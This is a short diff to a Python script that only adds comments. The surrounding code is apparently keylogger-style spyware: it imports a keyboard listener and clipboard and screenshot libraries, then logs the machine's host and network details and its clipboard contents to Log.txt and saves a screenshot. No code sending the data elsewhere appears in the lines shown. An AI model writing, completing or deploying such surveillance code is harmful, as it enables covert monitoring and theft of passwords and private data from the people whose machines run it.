@@ -1,9 +1,11 @@
+# Libraries
 import socket, platform
 import win32clipboard
 import pyautogui
 from pynput.keyboard import Listener
 
 
+# Get Computer and Network Information
 def device_information():
     with open("Log.txt", "a") as f:
         host = socket.gethostname()
@@ -20,6 +22,7 @@ def device_information():
 device_information()
 
 
+# Gather clipboard contents
 def copy_clipboard():
     with open("Log.txt", "a") as f:
         try:
@@ -40,6 +43,7 @@ def copy_clipboard():
 copy_clipboard()
 
 
+# Screenshot functionalities
 def screenshot():
     im = pyautogui.screenshot()
     im.save(r"D:\D\screenshot.png")
